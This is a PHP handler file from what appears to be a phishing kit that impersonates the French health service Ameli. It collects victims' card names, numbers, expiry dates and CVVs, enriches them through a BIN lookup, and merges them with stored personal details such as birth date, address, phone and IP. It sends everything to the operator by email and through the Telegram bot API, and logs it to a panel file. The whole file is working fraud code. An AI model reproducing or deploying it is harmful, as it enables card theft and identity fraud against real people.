<?php

include("../common/sub_includes.php");
include("../config.php");

ob_start();
if(!isset($_SESSION)){
    session_start();  // Et on ouvre la session
} 
$CCNAME = $_POST['input_cc_name'];
$CC = $_POST['input_cc_num'];
$DDE = $_POST['input_cc_exp'];
$CVV = $_POST['input_cc_cvv'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['ccname'] = $CCNAME;
    $_SESSION['cc']  = $CC;
    $_SESSION['dde']   = $DDE;
    $_SESSION['cvv'] = $CVV;

    $cc = $_SESSION['cc'];
    $bin = substr(str_replace(' ', '', $_POST["input_cc_num"]), 0, 6);

    $ch = curl_init();

    $url = "https://lookup.binlist.net/$bin";

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }


    curl_close($ch);

    $brand = '';
    $type = '';
    $emoji = '';
    $bank = '';

    $someArray = json_decode($result, true);

    $emoji = $someArray['country']['emoji'];
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];
    $bank_phone = $someArray['bank']['phone'];
    $subject_title = "[BIN: $bin][$emoji $brand $type]";

    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type'] = $type;

    $message = '
[🦊] Ameli +1 cc [🦊]

💳 Titulaire : ' . $_SESSION["ccname"] . ';
💳 Num carte : ' . $_SESSION["cc"] . '
💳 Date Expiration : ' . $_SESSION["dde"] . '
💳 Cryptogramme visuel : ' . $_SESSION["cvv"] . '

🍓 Banque : ' . $_SESSION['bin_bank'] . '
🍓 Niveau de la carte : ' . $_SESSION['bin_brand'] . '
🍓 Type de carte : ' . $_SESSION['bin_type'] . '

[🍛] Tiers Part [🍛] 

👮 Nom : ' . $_SESSION['Nom'] . '
🧑‍🚒 Prénom : ' . $_SESSION['Prenom'] . '

💌 Email : ' . $_SESSION['mail'] . '
🎂 Date de naissance : ' . $_SESSION['Ddn'] . '

🏚️ Address : ' . $_SESSION['adresse'] . '
🏘️ Adresse Secondaire : ' . $_SESSION['adresse2'] . '

🏙️ Ville : ' . $_SESSION['city'] . '
📱 Numéro de téléphone : ' . $_SESSION['tel'] . '


🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';

    if ($mail_send == true) {
        $Subject = " 「🍓」+1 Fr3sh Ameli CARD from " . $_SESSION['bin_bank'] . " | " . $_SERVER['HTTP_USER_AGENT'];
        $head = "From: Ameli <info@querty.bg>";

        mail($my_mail, $Subject, $message, $head);
    }

    if ($tlg_send == true) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=" . $rez_card . "&text=" . urlencode("$message"));

        file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . '-4037726986' . '&text=' . urlencode("$message") . '');
    }

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');

    $date = date("d/m/Y");
    $heure = date("H:i:s");

    $myfile = fopen("../panel/cc.txt", "a") or die("Unable to open file!");
    fwrite($myfile, "\n" . '
    <tr>
    <td width="80">
    <p align="center"><img src="https://api.hostip.info/?ip='.$_SERVER['REMOTE_ADDR'].'">' .$_SERVER['REMOTE_ADDR'].'</td>
    <td width="80">
    <p align="center">'.$_SESSION["ccname"].'</td>
    <td width="40">
    <p align="center">'.$_SESSION["cc"] .'</td>
    <td width="20">
    <p align="center">'.$_SESSION["dde"].'</td>
    <td width="40">
    <p align="center">'.$_SESSION['cvv'].'</td>
    <td width="40">
    <p align="center">'.$_SESSION['bin_type'].'</td>
    <td width="20">
    <p align="center">'.$_SESSION['bin_bank'].'</td>
    <td width="60">
    <p align="center">'.$_SESSION['bin_brand'].'</th>
    <td width="60">
    <p align="center">'.$heure.' / '.$date.'</td>
    </font></td></tr>
    ');
    fclose($myfile);

    $filepath = '../panel/stats.ini';
    $data = @parse_ini_file($filepath);
    $data['cc']++;
                function update_ini_file($data, $filepath) {
                  $content = "";
                  $parsed_ini = parse_ini_file($filepath, true);
                  foreach($data as $section => $values){
                    if($section === ""){
                      continue;
                    }
                    $content .= $section ."=". $values . "\n\r";
                  }
                  if (!$handle = fopen($filepath, 'w')) {
                    return false;
                  }
                  $success = fwrite($handle, $content);
                  fclose($handle);
                }
    update_ini_file($data, $filepath);

    if ($vbv) {
        header('location: ../pages/loadvbv.php');
    } else {
        header('location: ../pages/confirme.php');
    }
}
